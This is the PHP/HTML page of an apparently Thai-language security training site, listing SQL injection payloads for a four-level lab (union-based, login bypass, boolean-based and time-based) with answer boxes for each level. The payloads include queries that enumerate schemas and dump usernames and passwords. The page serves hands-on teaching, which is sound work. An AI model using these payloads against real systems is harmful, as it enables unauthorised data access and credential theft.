<?php
require_once dirname(__FILE__)."/../../../../_system/system.php";
?>
<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <title>HakkaBook</title>

    <link href='https://fonts.googleapis.com/css?family=Nunito' rel='stylesheet'>
    <!--load all Font Awesome styles -->
    <link href="../../../../assets/fontawesome/css/all.css" rel="stylesheet">


    <!--load CSS -->
    <link href="style.css" rel="stylesheet">

    <!-- Jquery CDN -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="script.js?v=2"></script>
</head>

<body>
    
    <style>
        
        .nextLevel {
            background: #1565C0;
            color: white;
            border-radius: 15px;
            text-shadow: 0px 4px 4px rgba(0, 0, 0, 0.25), 0px 4px 4px rgba(0, 0, 0, 0.25), 0px 4px 4px rgba(0, 0, 0, 0.25);

        }


        .nextLevel:hover {
            background: #1565C0;
            color: white;
        }

        .backLevel:hover {
            background: #1565C0;
            color: white;
        }
        .btn-orange{
            background: #1565C0;
            color: white;
        }
        .btn-orange:hover{
            background: #1565C0;
            color: white;
        }
        .custom-button{
            background: #1565C0;
            color: white;
        }
        .custom-button:hover{
            background: #1565C0;
            color: white;
        }
        .btn{
            border-radius: 15px;
        }
    </style>
    <style>

.text-bg2 {
    display: inline-block;
    padding: 11px 5px;

    text-align: left;
    height: auto;
    font-size: 20px;
    font-weight: 700;
    background: linear-gradient(90deg, rgba(185, 43, 39, 0.7) 0%, rgba(21, 101, 192, 0.7) 100%);
    box-shadow: inset 0px 0px 68px rgba(255, 255, 255, 0.05), inset 0px 4px 4px rgba(255, 255, 255, 0.15);
    /* Note: backdrop-filter has minimal browser support */

    border-radius: 10px;

    /* Note: backdrop-filter has minimal browser support */

}
    </style>
    <img class="imagebanner" src="img/banner.jpg">
    <div class="imgshadow"></div>
    <div class="text-center text-white mt-5" style="font-size: 85px; font-weight: 900; letter-spacing: 1px;">
        <span>รวมคำสั่งสำหรับการทำแลป</span>
    </div>
    <div class="container mt-5">
        <div class="custom-card">
            <p style="font-size: 20px;">สวัสดีครับทุกท่านมาเจอกันอีกแล้วนะ ในแลปของ <b>SQL Injection</b> โดยภายในแลปจะมีทั้งหมด <b>4</b> เลเวลด้วยกันซึ่งจะเป็นการ
                ไล่ระดับความยากในการทำไปเรื่อยๆ  โดยเราจะมี <b>Sheet</b> และเนื้อหาการอธิบายบางส่วนให้คุณได้เรียนรู้และเข้าใจก่อน
                จะเริ่มทำครับ เดี๋ยวไปเริ่มกันเลยดีกว่า</p>
        </div>
        <div class="row">
            <div class="col-lg-6 mt-4">
                
                <a href="../../" class="btn nextLevel" style="font-size: 20px;"><i style="padding-left: 5px;" class="fa-solid fa-circle-arrow-left"></i> ย้อนกลับ</a>
                </div>
            <div class="col-lg-6 mt-4 text-end">
                <a href="../1/" id="nextlevel" class="btn nextLevel"  style="font-size: 20px;">LEVEL ONE <i style="padding-left: 5px;"
                        class="fa-solid fa-circle-arrow-right"></i></a>
            </div>
        </div>
        
        <!-- LEVEL 1 -->
        <div class="mt-5 custom-card">
            <h2><b class="text-white">ERROR BASED SQLI</b></span></h2>
            <h4 style="" class="mt-4">LEVEL 1</h4>
            <div class="mt-4 text-bg2" >1 UNION SELECT 1</div><br>
            <div class="mt-4 text-bg2" >1 UNION SELECT 1,2</div><br>
            <div class="mt-4 text-bg2" >1 UNION SELECT 1,2,3</div><br>
            <div class="mt-4 text-bg2" >0 UNION SELECT 1,2,3</div><br>
            <div class="mt-4 text-bg2" >0 UNION SELECT 1,2,database()</div><br>
            <div class="mt-4 text-bg2" >0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'</div><br>
            <div class="mt-4 text-bg2" >0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'</div><br>
            <div class="mt-4 text-bg2" >0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') FROM staff_users</div><br>

            <h3 class="mt-5 text-white">คำถามม</h3>

                <div class="custom-card1 mt-5">
                    <div class="mt-4"></div>
                    <p style="font-size: 20px;">ให้นำคำตอบที่ได้ในตอนท้ายหลังจากทำ LEVEL 1 สำเร็จมาตอบในช่องนี้</p>
                    <div class="row ">
                        <div class="col-lg-6">
                            <input class="input" id="answer1" value="<?php echo account()->checkLabQuestion($_SESSION['id'], "sql_lv1") ?>" placeholder="ใส่คำตอบ...">
                        </div>
                        <div class="col-lg-3">
                            <button id="answerbutton1" class="btn custom-button"  style="font-size: 20px;">ยืนยันคำตอบ</button>
                        </div>
                    </div>
                    
                    <div class="mt-4"></div>
                </div>
        </div>
        
        <!-- LEVEL 2 -->
        <div class="mt-5 custom-card">
            <h2><b class="text-white">BLIND SQLI</b></h2>
            <h4 class="mt-4">LEVEL 2</h4>
            <div class="mt-4 text-bg2" >select * from users where username='%username%' and password='%password%' LIMIT 1;</div><br>
            <div class="mt-4 text-bg2" >' OR 1=1;--</div><br>
            <div class="mt-4 text-bg2" >select * from users where username='' and password='' OR 1=1;</div><br>

            <h3 class="mt-5 text-white">คำถามม</h3>

                <div class="custom-card1 mt-5">
                    <div class="mt-4"></div>
                    <p style="font-size: 20px;">ให้นำคำตอบที่ได้ในตอนท้ายหลังจากทำ LEVEL 2 สำเร็จมาตอบในช่องนี้</p>
                    <div class="row ">
                        <div class="col-lg-6">
                            <input class="input" id="answer2" value="<?php echo account()->checkLabQuestion($_SESSION['id'], "sql_lv2") ?>" placeholder="ใส่คำตอบ...">
                        </div>
                        <div class="col-lg-3">
                            <button id="answerbutton2" class="btn custom-button" style="font-size: 20px;">ยืนยันคำตอบ</button>
                        </div>
                    </div>
                    
                    <div class="mt-4"></div>
                </div>
        </div>
        
        <!-- LEVEL 3 -->
        <div class="mt-5 custom-card">
            <h2><b class="text-white">BOOLEAN BASED</b></h2>
            <h4 class="mt-4">LEVEL 3</h4>
            <div class="mt-4 text-bg2" >select * from users where username = '%username%' LIMIT 1;</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1;--</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3;-- </div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3 where database() like '%';--</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3 where database() like 's%';--</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3 from users where username like 'a%</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%</div><br>

            <h3 class="mt-5 text-white">คำถามม</h3>

                <div class="custom-card1 mt-5">
                    <div class="mt-4"></div>
                    <p style="font-size: 20px;">ให้นำคำตอบที่ได้ในตอนท้ายหลังจากทำ LEVEL 3 สำเร็จมาตอบในช่องนี้</p>
                    <div class="row ">
                        <div class="col-lg-6">
                            <input class="input" id="answer3" value="<?php echo account()->checkLabQuestion($_SESSION['id'], "sql_lv3") ?>" placeholder="ใส่คำตอบ...">
                        </div>
                        <div class="col-lg-3">
                            <button id="answerbutton3" class="btn custom-button" style="font-size: 20px;">ยืนยันคำตอบ</button>
                        </div>
                    </div>
                    
                    <div class="mt-4"></div>
                </div>
        </div>


        <!-- LEVEL 4 -->
        <div class="mt-5 custom-card">
            <h2><b class="text-white">TIME BASED</b></h2>
            <h4 class="mt-4">LEVEL 4</h4>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT SLEEP(5);--</div><br>
            <div class="mt-4 text-bg2" >admin123' UNION SELECT SLEEP(5),2;--</div><br>
            <div class="mt-4 text-bg2" >referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--</div><br>

            <h3 class="mt-5 text-white">คำถามม</h3>

                <div class="custom-card1 mt-5">
                    <div class="mt-4"></div>
                    <p style="font-size: 20px;">ให้นำคำตอบที่ได้ในตอนท้ายหลังจากทำ LEVEL 4 สำเร็จมาตอบในช่องนี้</p>
                    <div class="row ">
                        <div class="col-lg-6">
                            <input class="input" id="answer4" value="<?php echo account()->checkLabQuestion($_SESSION['id'], "sql_lv4") ?>" placeholder="ใส่คำตอบ...">
                        </div>
                        <div class="col-lg-3">
                            <button id="answerbutton4" class="btn custom-button" style="font-size: 20px;">ยืนยันคำตอบ</button>
                        </div>
                    </div>
                    
                    <div class="mt-4"></div>
                </div>
        </div>




        
    </div>
    <div class="mt-5">

    </div>
    
    <?php
    require_once("../../../../totop.php");
    ?>
    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
        crossorigin="anonymous"></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
    -->
</body>

</html>